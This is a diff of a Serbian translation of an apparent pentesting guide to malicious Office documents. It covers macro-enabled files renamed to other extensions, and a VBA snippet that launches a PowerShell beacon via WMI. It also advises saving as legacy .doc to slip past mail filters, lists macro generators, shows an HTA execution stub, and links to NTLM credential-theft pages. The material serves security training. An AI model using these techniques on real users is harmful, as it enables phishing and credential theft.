@@ -6,7 +6,7 @@
 
 Microsoft Word vrši validaciju podataka datoteke pre otvaranja datoteke. Validacija podataka se vrši u obliku identifikacije strukture podataka, prema OfficeOpenXML standardu. Ako dođe do bilo kakve greške tokom identifikacije strukture podataka, datoteka koja se analizira neće biti otvorena.
 
-Obično, Word datoteke koje sadrže makroe koriste `.docm` ekstenziju. Međutim, moguće je preimenovati datoteku promenom ekstenzije datoteke i i dalje zadržati mogućnosti izvršavanja makroa.\
+Obično, Word datoteke koje sadrže makroe koriste `.docm` ekstenziju. Međutim, moguće je preimenovati datoteku promenom ekstenzije datoteke i i dalje zadržati sposobnosti izvršavanja makroa.\
 Na primer, RTF datoteka ne podržava makroe, po dizajnu, ali DOCM datoteka preimenovana u RTF biće obrađena od strane Microsoft Word-a i biće sposobna za izvršavanje makroa.\
 Iste unutrašnje strukture i mehanizmi se primenjuju na sve softvere iz Microsoft Office Suite (Excel, PowerPoint itd.).
 
@@ -14,7 +14,7 @@ Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvrše
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX datoteke koje se pozivaju na udaljeni šablon (Datoteka – Opcije – Dodaci – Upravljanje: Šabloni – Idi) koji uključuje makroe mogu takođe "izvršavati" makroe.
+DOCX datoteke koje se pozivaju na udaljeni šablon (Datoteka – Opcije – Dodaci – Upravljanje: Šabloni – Idi) koji uključuje makroe mogu takođe “izvršavati” makroe.
 
 ### Učitavanje spoljne slike
 
@@ -64,26 +64,26 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Ručno uklonite metapodatke
+#### Ručno uklanjanje metapodataka
 
-Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.
+Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite na **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.
 
-#### Doc ekstenzija
+#### Doc Ekstenzija
 
 Kada završite, odaberite **Save as type** padajući meni, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
-Uradite to jer **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** **oko** makro-omogućene **`.docm`** ekstenzije (npr. ikona sličice ima ogromnu `!` i neki web/email prolazi ih potpuno blokiraju). Stoga, ova **legacy `.doc` ekstenzija je najbolje rešenje**.
+To radite jer **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** **oko** makro-omogućene **`.docm`** ekstenzije (npr. ikona sličice ima ogromnu `!` i neki web/email prolazi ih potpuno blokiraju). Stoga, ova **legacy `.doc` ekstenzija je najbolje rešenje**.
 
-#### Zloćudni generatori makroa
+#### Maliciozni Generatori Makroa
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA datoteke
+## HTA Fajlovi
 
-HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "potpuno poverljiva" aplikacija, bez ograničenja sigurnosnog modela pretraživača.
+HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "potpuno poverljiva" aplikacija, bez ograničenja bezbednosnog modela pretraživača.
 
-HTA se izvršava koristeći **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer**, čineći **`mshta` zavisnim od IE**. Dakle, ako je deinstaliran, HTA neće moći da se izvrši.
+HTA se izvršava koristeći **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer**, čineći **`mshta` zavisnim od IE**. Dakle, ako je deinstaliran, HTA-ovi neće moći da se izvrše.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -144,9 +144,11 @@ Postoji nekoliko načina da se **prisilite NTLM autentifikaciju "na daljinu"**, 
 
 **Proverite ove ideje i još više na sledećim stranicama:**
 
+
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
 {{#endref}}
+
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
